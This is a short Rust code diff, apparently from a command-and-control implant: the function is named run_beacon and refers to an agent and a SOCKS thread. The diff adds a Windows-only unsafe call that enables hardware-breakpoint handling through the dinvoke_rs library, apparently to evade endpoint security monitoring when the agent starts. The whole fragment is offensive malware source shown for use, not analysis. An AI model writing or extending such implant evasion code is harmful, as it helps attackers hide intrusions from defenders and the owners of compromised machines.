@@ -90,6 +90,11 @@ pub fn real_main() -> Result<(), Box<dyn Error>> {
 
 /// Main code which runs the agent
 fn run_beacon() -> Result<(), Box<dyn Error>> {
+    #[cfg(target_os = "windows")]
+    {
+        unsafe { dinvoke_rs::dinvoke::use_hardware_breakpoints(true); }
+    }
+
     let mut agent = crate::Agent::new();
 
     // SOCKS thread will be started automatically when SOCKS messages are received
